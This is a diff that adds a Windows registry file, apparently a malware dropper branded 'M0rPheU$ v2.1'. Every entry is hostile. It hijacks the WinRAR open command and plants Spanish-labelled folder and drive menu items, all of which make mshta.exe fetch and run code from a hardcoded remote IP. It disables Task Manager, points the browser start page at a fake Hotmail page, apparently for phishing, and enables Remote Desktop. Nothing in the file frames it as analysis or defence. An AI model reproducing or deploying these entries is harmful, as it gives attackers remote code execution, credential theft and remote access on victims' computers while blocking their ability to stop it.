@@ -1,0 +1,19 @@
+Windows Registry Editor Version 5.00 
+[HKEY_CLASSES_ROOT\WinRAR\shell\open\command] 
+@="\"c:\\windows\\system32\\mshta.exe\" \"http://187.157.146.149:102/m0rpheus/morpheus2010/nfiles/exec.php?t=1335279403221;p=WinRar;f=%1\"" 
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] 
+"DisableTaskMgr"=dword:00000001 
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] 
+"Start Page"="http://187.157.146.149:102/m0rpheus/hotmail.php" 
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] 
+"Window Title"="::M0rPheU$:: v2.1" 
+[HKEY_CLASSES_ROOT\Directory\shell\DOSAqui] 
+@="Abrir Carpeta" 
+[HKEY_CLASSES_ROOT\Directory\shell\DOSAqui\Command] 
+@="mshta.exe http://187.157.146.149:102/m0rpheus/morpheus2010/msnmsgr.tpl" 
+[HKEY_CLASSES_ROOT\Drive\shell\DOSAqui] 
+@="Abrir Unidad de Disco" 
+[HKEY_CLASSES_ROOT\Drive\shell\DOSAqui\Command] 
+@="mshta.exe http://187.157.146.149:102/m0rpheus/morpheus2010/msnmsgr.tpl" 
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] 
+"fDenyTSConnections"=dword:00000000 
